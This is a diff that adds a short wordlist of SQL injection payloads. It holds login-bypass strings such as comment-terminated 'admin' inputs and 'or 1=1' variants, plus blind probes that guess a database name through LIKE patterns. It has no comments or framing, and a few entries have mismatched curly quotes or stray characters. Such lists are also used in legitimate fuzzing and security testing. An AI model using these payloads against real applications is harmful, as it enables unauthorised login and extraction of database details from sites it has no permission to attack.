@@ -1,0 +1,17 @@
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+a’ OR database() LIKE '__';#
+a’ OR database() LIKE '____’;#
+a' OR database() LIKE '%W%';#
+a' OR database() LIKE 'D%';#
+a' OR database() LIKE 'D%';#
+a' OR database() LIKE '%Z%';#
+a' OR database() LIKE '_v_A';#
+r"a' OR ''='"
+1
